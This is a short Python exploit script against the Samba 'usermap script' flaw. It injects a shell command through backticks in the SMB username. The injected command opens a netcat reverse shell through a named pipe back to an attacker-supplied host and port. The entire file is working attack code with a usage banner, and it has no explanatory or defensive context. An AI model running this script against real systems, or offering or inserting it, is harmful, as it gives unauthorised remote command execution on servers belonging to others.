import sys
from smb.SMBConnection import SMBConnection


def exploit(rhost, rport, lhost, lport):
    payload = 'mkfifo /tmp/pmital; nc ' + lhost + ' ' + lport + ' 0</tmp/pmital | /bin/sh >/tmp/pmital 2>&1; rm /tmp/pmital'
    username = "/=`nohup " + payload + "`"
    conn = SMBConnection(username, "", "", "")
    try:
        conn.connect(rhost, int(rport), timeout=1)
    except:
        print("[+] Payload was sent - check net cat!")


if __name__ == '__main__':
    print('[+] SAMBA usermap script')
    if len(sys.argv) != 5:
        print('[-] usage: python ' + sys.argv[0] + '<RHOST><RPORT><LHOST><LPORT>')
    else:
        print("[+] Connecting ...")
        rhost = sys.argv[1]
        rport = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]
        exploit(rhost, rport, lhost, lport)
